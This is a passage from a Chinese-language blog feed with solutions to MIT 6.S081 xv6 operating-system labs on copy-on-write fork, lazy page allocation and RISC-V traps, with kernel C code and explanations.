class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">uvmcopy(<span class="keyword">pagetable_t</span> old, <span class="keyword">pagetable_t</span> <span class="keyword">new</span>, uint64 sz)</span><br><span class="line">{</span><br><span class="line">  <span class="keyword">pte_t</span> *pte;</span><br><span class="line">  uint64 pa, i;</span><br><span class="line">  uint flags;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; sz; i += PGSIZE){</span><br><span class="line">    <span class="keyword">if</span>((pte = walk(old, i, <span class="number">0</span>)) == <span class="number">0</span>)</span><br><span class="line">      panic(<span class="string">"uvmcopy: pte should exist"</span>);</span><br><span class="line">    <span class="keyword">if</span>((*pte &amp; PTE_V) == <span class="number">0</span>)</span><br><span class="line">      panic(<span class="string">"uvmcopy: page not present"</span>);</span><br><span class="line">    pa = PTE2PA(*pte);</span><br><span class="line">    flags = PTE_FLAGS(*pte);</span><br><span class="line">    <span class="comment">// only for writable page</span></span><br><span class="line">    <span class="keyword">if</span> (flags &amp; PTE_W) {</span><br><span class="line">      flags = (flags | PTE_COW) &amp; (~PTE_W);</span><br><span class="line">      *pte = PA2PTE(pa) | flags;</span><br><span class="line">    }</span><br><span class="line">    increase_rc(pa);</span><br><span class="line">    <span class="keyword">if</span>(mappages(<span class="keyword">new</span>, i, PGSIZE, pa, flags) != <span class="number">0</span>){</span><br><span class="line">      <span class="keyword">goto</span> err;</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"> err:</span><br><span class="line">  uvmunmap(<span class="keyword">new</span>, <span class="number">0</span>, i / PGSIZE, <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>注意<code>mappages</code>失败时，删掉原有的<code>kfree(mem)</code>，因为我们没有申请新的内存。</p></li><li><p>发生<code>page falut</code>时，在<code>usertrap()</code>中捕获，对<code>cow page</code>分配真正的物理内存。</p><p><code>kernel/kalloc.c</code></p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">cow_alloc(<span class="keyword">pagetable_t</span> pagetable, uint64 va) {</span><br><span class="line">  uint64 pa;</span><br><span class="line">  uint64 mem;</span><br><span class="line">  <span class="keyword">pte_t</span> *pte;</span><br><span class="line">  <span class="keyword">if</span> (va &gt;= MAXVA)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  va = PGROUNDDOWN(va);</span><br><span class="line">  pte = walk(pagetable, va, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> (pte == <span class="number">0</span>) {</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="comment">// not a valid cow page</span></span><br><span class="line">  <span class="keyword">if</span> (!(*pte &amp; PTE_V)) {</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-2</span>;</span><br><span class="line">  }</span><br><span class="line">  pa = PTE2PA(*pte);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// only one rf, make it writable</span></span><br><span class="line">  acquire(&amp;kmem.lock);</span><br><span class="line">  <span class="keyword">if</span> (kmem.rc[pa / PGSIZE] == <span class="number">1</span>) {</span><br><span class="line">    *pte &amp;= ~PTE_COW;</span><br><span class="line">    *pte |= PTE_W;</span><br><span class="line">    <span class="built_in">release</span>(&amp;kmem.lock);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="built_in">release</span>(&amp;kmem.lock);</span><br><span class="line">  <span class="keyword">if</span> ((mem = (uint64)kalloc()) == <span class="number">0</span>){</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-3</span>;</span><br><span class="line">  }</span><br><span class="line">  memmove((<span class="keyword">void</span> *)mem, (<span class="keyword">void</span> *)pa, PGSIZE);</span><br><span class="line">  *pte = ((PA2PTE(mem) | PTE_FLAGS(*pte) | PTE_W) &amp; (~PTE_COW));</span><br><span class="line">  <span class="comment">// decrease rc</span></span><br><span class="line">  kfree((<span class="keyword">void</span> *)pa);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>在我的实现中，当<code>cow page</code>发生<code>page fault</code>，且<code>reference count</code>为1时，不再重新分配页面进行复制，而是直接将该页面消去<code>PTE_COW</code>并加上<code>PTE_W</code>，减少内存分配和复制操作。</p><p>在<code>kernel/trap.c</code>：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(r_scause() == <span class="number">13</span> || r_scause() == <span class="number">15</span>) {</span><br><span class="line">  va = r_stval();</span><br><span class="line">  <span class="keyword">if</span> (va &lt; PGROUNDDOWN(p-&gt;trapframe-&gt;sp) &amp;&amp; </span><br><span class="line">      va &gt;= PGROUNDDOWN(p-&gt;trapframe-&gt;sp) - PGSIZE) {</span><br><span class="line">    <span class="comment">// guard page</span></span><br><span class="line">    p-&gt;killed = <span class="number">1</span>;</span><br><span class="line">  } <span class="keyword">else</span> {</span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line">    <span class="keyword">if</span>((ret = cow_alloc(p-&gt;pagetable, va)) &lt; <span class="number">0</span> ) {</span><br><span class="line">      p-&gt;killed = <span class="number">1</span>;</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>当使用<code>kalloc()</code>进行内存分配时，需要将对应<code>page</code>的<code>reference count</code>设置为1，使用<code>kfree()</code>释放内存时，只能将<code>reference count</code>为0的页面放回空闲列表。</p><p><code>kernel/kalloc.c</code>：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">void</span> *</span><br><span class="line">kalloc(<span class="keyword">void</span>)</span><br><span class="line">{</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">run</span> *<span class="title">r</span>;</span></span><br><span class="line"></span><br><span class="line">  acquire(&amp;kmem.lock);</span><br><span class="line">  r = kmem.freelist;</span><br><span class="line">  <span class="keyword">if</span>(r) {</span><br><span class="line">    kmem.freelist = r-&gt;next;</span><br><span class="line">    kmem.rc[(uint64)r / PGSIZE] = <span class="number">1</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="built_in">release</span>(&amp;kmem.lock);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(r)</span><br><span class="line">    <span class="built_in">memset</span>((<span class="keyword">char</span>*)r, <span class="number">5</span>, PGSIZE); <span class="comment">// fill with junk</span></span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">void</span>*)r;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span></span><br><span class="line">kfree(<span class="keyword">void</span> *pa)</span><br><span class="line">{</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">run</span> *<span class="title">r</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(((uint64)pa % PGSIZE) != <span class="number">0</span> || (<span class="keyword">char</span>*)pa &lt; <span class="built_in">end</span> || (uint64)pa &gt;= PHYSTOP)</span><br><span class="line">    panic(<span class="string">"kfree"</span>);</span><br><span class="line"></span><br><span class="line">  acquire(&amp;kmem.lock);</span><br><span class="line">  kmem.rc[(uint64)pa / PGSIZE]--;</span><br><span class="line">  <span class="keyword">if</span>(kmem.rc[(uint64)pa / PGSIZE] &lt;= <span class="number">0</span>) {</span><br><span class="line">    <span class="built_in">memset</span>(pa, <span class="number">1</span>, PGSIZE);</span><br><span class="line">    r = (struct <span class="built_in">run</span>*)pa;</span><br><span class="line">    r-&gt;next = kmem.freelist;</span><br><span class="line">    kmem.freelist = r;</span><br><span class="line">  }</span><br><span class="line">  <span class="built_in">release</span>(&amp;kmem.lock);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><em>注意</em>：<code>kfree()</code>中，对于<code>kmem.rc[(uint64)pa / PGSIZE]</code>的修改和读取必须是一个原子操作，否则内存可能被重复释放，例如对于某个物理<code>page</code>，同时map到A、B的页表中，之后：</p><ul><li>A : ref - 1</li><li>B : ref - 1</li><li>A : ref == 0 =&gt; free</li><li>B : ref == 0 =&gt; free</li></ul></li><li><p>最后，我们需要修改<code>copyout()</code>，同<code>lazy allocation</code>一样，当因为系统调用切换到内核页表时，硬件无法再为写<code>cow page</code>产生<code>page fault</code>，所以我们需要手动处理：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span></span><br><span class="line">copyout(<span class="keyword">pagetable_t</span> pagetable, uint64 dstva, <span class="keyword">char</span> *src, uint64 len)</span><br><span class="line">{</span><br><span class="line">  uint64 n, va0, pa0;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">while</span>(len &gt; <span class="number">0</span>){</span><br><span class="line">    va0 = PGROUNDDOWN(dstva);</span><br><span class="line">    cow_alloc(pagetable, va0);</span><br><span class="line">    pa0 = walkaddr(pagetable, va0);</span><br><span class="line">    <span class="keyword">if</span>(pa0 == <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    n = PGSIZE - (dstva - va0);</span><br><span class="line">    <span class="keyword">if</span>(n &gt; len)</span><br><span class="line">      n = len;</span><br><span class="line">    memmove((<span class="keyword">void</span> *)(pa0 + (dstva - va0)), src, n);</span><br><span class="line"></span><br><span class="line">    len -= n;</span><br><span class="line">    src += n;</span><br><span class="line">    dstva = va0 + PGSIZE;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>至此便完成了lab6 copy on write。</p><p>最终代码见<a href="https://github.com/Jason210314/xv6-labs-2020/tree/cow">GitHub仓库</a>。</p></li></ul><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> OS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 6.S081 </tag>
            
            <tag> copy on write </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>6.S081 lab5 lazy</title>
      <link href="2021/02/25/6-s081-lab5-lazy/"/>
      <url>2021/02/25/6-s081-lab5-lazy/</url>
      
        <content type="html"><![CDATA[<h1 id="Eliminate-allocation-from-sbrk"><a href="#Eliminate-allocation-from-sbrk" class="headerlink" title="Eliminate allocation from sbrk()"></a>Eliminate allocation from sbrk()</h1><p>这次实验的第一关非常简单，就是从<code>sbrk</code>调用中取消内存分配，为之后的<code>lazt allocation</code>做准备。</p><a id="more"></a><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">uint64</span><br><span class="line">sys_sbrk(<span class="keyword">void</span>)</span><br><span class="line">{</span><br><span class="line">  <span class="keyword">int</span> addr;</span><br><span class="line">  <span class="keyword">int</span> n;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span>(argint(<span class="number">0</span>, &amp;n) &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span> = <span class="title">myproc</span>();</span></span><br><span class="line">  addr = p-&gt;sz;</span><br><span class="line">p-&gt;sz += n;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> addr;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>hints提示我们，修改完代码后，尝试运行<code>echo hi</code>，会产生类似下面的结果:</p><figure class="highlight bash"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> hi</span><br><span class="line">usertrap(): unexpected scause 0x000000000000000f pid=3</span><br><span class="line">            sepc=0x0000000000001258 stval=0x0000000000004008</span><br><span class="line">va=0x0000000000004000 pte=0x0000000000000000</span><br><span class="line">panic: uvmunmap: not mapped</span><br></pre></td></tr></tbody></table></figure><p>其实并不一定是<code>echo</code>才会导致crash，其他的执行任意的命令或者输入无意义字符都会导致crash。在<code>user/umalloc.c</code>中，<code>morecore</code>调用了<code>sbrk</code>，<code>malloc</code>调用了<code>morecore</code>。在<code>user/sh.c</code>中，shell运行过程中不断地调用<code>malloc</code>为command申请分配空间，然后运行command。这个过程中，malloc并未真正分配空间，运行时访问到对应虚拟地址就会产生page fault，导致panic；</p><h1 id="Lazy-allocation"><a href="#Lazy-allocation" class="headerlink" title="Lazy allocation"></a>Lazy allocation</h1><p>这一关需要我们实现<code>lazy allocation</code>，在<code>usertrap()</code>中处理<code>page fault</code>，为产生<code>page fault</code>的虚拟地址分配一个真实的物理页面，并map到对应虚拟地址。</p><p><code>r_scause()</code>用于获取trap产生的原因，为13/15时为<code>page fault</code>。</p><p><code>r_stval()</code>获取<code>stval</code>寄存器值，它是导致<code>page fault</code>的虚拟地址值。</p><p><code>uvmunmap()</code>会panic，因为进程地址空间有些虚拟地址并未被map，所要加以修改。</p><p>参照<code>uvmalloc()</code>，完成如下函数，为虚拟地址<code>va</code>分配一个真实物理页：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">uint64</span><br><span class="line">lazy_uvmalloc(<span class="keyword">pagetable_t</span> pagetable, uint64 va)</span><br><span class="line">{ </span><br><span class="line">  <span class="keyword">char</span> *mem;</span><br><span class="line"></span><br><span class="line">  va = PGROUNDDOWN(va);</span><br><span class="line">  mem = kalloc();</span><br><span class="line">  <span class="keyword">if</span>(mem == <span class="number">0</span>){</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="built_in">memset</span>(mem, <span class="number">0</span>, PGSIZE);</span><br><span class="line">  <span class="keyword">if</span>(mappages(pagetable, va, PGSIZE, (uint64)mem, PTE_W|PTE_X|PTE_R|PTE_U) != <span class="number">0</span>) {</span><br><span class="line">    kfree(mem);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>在<code>usertrap()</code>中加入对于<code>page fault</code>的处理：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(cause == <span class="number">13</span> || cause == <span class="number">15</span>) {</span><br><span class="line">  uint64 va = r_stval();</span><br><span class="line">  <span class="keyword">if</span>(lazy_uvmalloc(p-&gt;pagetable, va) != <span class="number">0</span>) {</span><br><span class="line">    p-&gt;killed = <span class="number">1</span>;</span><br><span class="line">}</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>添加以上代码之后，在<code>uvmunmap()</code>中添加如下修改，取消<code>panic</code>：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>((pte = walk(pagetable, a, <span class="number">0</span>)) == <span class="number">0</span>)</span><br><span class="line">  <span class="comment">// panic("uvmunmap: walk");</span></span><br><span class="line">  <span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">if</span>((*pte &amp; PTE_V) == <span class="number">0</span>)</span><br><span class="line">  <span class="comment">// panic("uvmunmap: not mapped");</span></span><br><span class="line">  <span class="keyword">continue</span>;</span><br></pre></td></tr></tbody></table></figure><p>完成如上代码后，<code>echo hi</code>可以正常运行。</p><h1 id="Lazytests-and-Usertests"><a href="#Lazytests-and-Usertests" class="headerlink" title="Lazytests and Usertests"></a>Lazytests and Usertests</h1><p>第三关需要处理第二关的一些遗留细节问题，完善<code>lazy allocation</code>，使之通过全部测试。</p><blockquote><ul><li>Handle negative sbrk() arguments.</li></ul></blockquote><p>对于负数参数，需要<code>unmap</code>对应页面:</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(n &lt; <span class="number">0</span>){</span><br><span class="line">  p-&gt;sz = uvmdealloc(p-&gt;pagetable, p-&gt;sz, p-&gt;sz + n);</span><br><span class="line">} <span class="keyword">else</span> {</span><br><span class="line">  p-&gt;sz += n;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><blockquote><ul><li><p>Kill a process if it page-faults on a virtual memory address higher than any allocated with sbrk().</p></li><li><p>Handle faults on the invalid page below the user stack.</p></li></ul></blockquote><p>这里需要判断产生<code>page fault</code>的va是否在当前进程拥有的地址范围之外。</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (va &gt;= p-&gt;sz || va &lt; p-&gt;trapframe-&gt;sp)</span><br><span class="line">  p-&gt;killed = <span class="number">1</span>;</span><br></pre></td></tr></tbody></table></figure><blockquote><ul><li>Handle the parent-to-child memory copy in fork() correctly.</li></ul></blockquote><p>在<code>fork()</code>中，使用如下代码将内存从父进程复制到子进程：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Copy user memory from parent to child.</span></span><br><span class="line"><span class="keyword">if</span>(uvmcopy(p-&gt;pagetable, np-&gt;pagetable, p-&gt;sz) &lt; <span class="number">0</span>){</span><br><span class="line">  freeproc(np);</span><br><span class="line">  <span class="built_in">release</span>(&amp;np-&gt;lock);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>进入<code>uvmcopy()</code>，做出如下修改：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>((pte = walk(old, i, <span class="number">0</span>)) == <span class="number">0</span>)</span><br><span class="line">  <span class="comment">// panic("uvmcopy: pte should exist");</span></span><br><span class="line">  <span class="keyword">continue</span>;</span><br><span class="line"><span class="keyword">if</span>((*pte &amp; PTE_V) == <span class="number">0</span>)</span><br><span class="line">  <span class="comment">// panic("uvmcopy: page not present");</span></span><br><span class="line">  <span class="keyword">continue</span>;</span><br></pre></td></tr></tbody></table></figure><blockquote><ul><li>Handle the case in which a process passes a valid address from sbrk() to a system call such as read or write, but the memory for that address has not yet been allocated.</li></ul></blockquote><p>当进程进行<code>syscall</code>时，会陷入kernel，此时<code>stap</code>切换为内核页表，<code>RISC-V</code>硬件无法再为用户地址空间产生<code>page fault</code>，所以当用户执行<code>read()</code>和<code>write()</code>，将用户地址空间的有效虚拟地址传递给内核时，如果该虚拟地址没有map到有效物理内存，将会导致程序panic。kernel运行时，使用<code>walkaddr</code>进行虚实地址转换，所以我们需要修改其中的代码，当虚拟地址有效而页表中未map时，尝试为其分配物理内存：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">uint64</span><br><span class="line">walkaddr(<span class="keyword">pagetable_t</span> pagetable, uint64 va)</span><br><span class="line">{</span><br><span class="line">  <span class="keyword">pte_t</span> *pte;</span><br><span class="line">  uint64 pa;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span> = <span class="title">myproc</span>();</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>(va &gt;= MAXVA)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  pte = walk(pagetable, va, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span>(pte == <span class="number">0</span> || (*pte &amp; PTE_V) == <span class="number">0</span>) {</span><br><span class="line">    <span class="keyword">if</span> (va &gt;= p-&gt;sz || va &lt; p-&gt;trapframe-&gt;sp) {</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">if</span>(lazy_uvmalloc(pagetable, va) == <span class="number">0</span>) {</span><br><span class="line">      pte = walk(pagetable, va, <span class="number">0</span>);;</span><br><span class="line">    } <span class="keyword">else</span> {</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">if</span>((*pte &amp; PTE_U) == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  pa = PTE2PA(*pte);</span><br><span class="line">  <span class="keyword">return</span> pa;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><blockquote><ul><li>Handle out-of-memory correctly: if kalloc() fails in the page fault handler, kill the current process.</li></ul></blockquote><p>在关卡2中，已经做到了这一点，当<code>lazy_uvmalloc()</code>调用<code>kalloc()</code>失败时，返回非0，杀掉进程：</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(lazy_uvmalloc(p-&gt;pagetable, va) != <span class="number">0</span>) {</span><br><span class="line">  p-&gt;killed = <span class="number">1</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>做完如上修改，便能通过所有测试。</p><p>最终代码见<a href="https://github.com/Jason210314/xv6-labs-2020/tree/lazy">github仓库</a>。</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> OS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 6.S081 </tag>
            
            <tag> lazy allocation </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>6.S081 lab4 traps</title>
      <link href="2021/02/25/6-s081-lab4-traps/"/>
      <url>2021/02/25/6-s081-lab4-traps/</url>
      
        <content type="html"><![CDATA[<h1 id="RISC-V-assembly"><a href="#RISC-V-assembly" class="headerlink" title="RISC-V assembly"></a>RISC-V assembly</h1><p>这是一个简单的<code>RISC-V</code>汇编热身关卡。</p><p>我们需要查看<code>user/call.asm</code>来回答一些问题，其主要内容如下：</p><a id="more"></a><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">int g(int x) {</span><br><span class="line">   0:1141                addisp,sp,-16</span><br><span class="line">   2:e422                sds0,8(sp)</span><br><span class="line">   4:0800                addis0,sp,16</span><br><span class="line">  return x+3;</span><br><span class="line">}</span><br><span class="line">   6:250d                addiwa0,a0,3</span><br><span class="line">   8:6422                lds0,8(sp)</span><br><span class="line">   a:0141                addisp,sp,16</span><br><span class="line">   c:8082                ret</span><br><span class="line"></span><br><span class="line">000000000000000e &lt;f&gt;:</span><br><span class="line"></span><br><span class="line">int f(int x) {</span><br><span class="line">   e:1141                addisp,sp,-16</span><br><span class="line">  10:e422                sds0,8(sp)</span><br><span class="line">  12:0800                addis0,sp,16</span><br><span class="line">  return g(x);</span><br><span class="line">}</span><br><span class="line">  14:250d                addiwa0,a0,3</span><br><span class="line">  16:6422                lds0,8(sp)</span><br><span class="line">  18:0141                addisp,sp,16</span><br><span class="line">  1a:8082                ret</span><br><span class="line"></span><br><span class="line">000000000000001c &lt;main&gt;:</span><br><span class="line"></span><br><span class="line">void main(void) {</span><br><span class="line">  1c:1141                addisp,sp,-16</span><br><span class="line">  1e:e406                sdra,8(sp)</span><br><span class="line">  20:e022                sds0,0(sp)</span><br><span class="line">  22:0800                addis0,sp,16</span><br><span class="line">  printf("%d %d\n", f(8)+1, 13);</span><br><span class="line">  24:4635                lia2,13</span><br><span class="line">  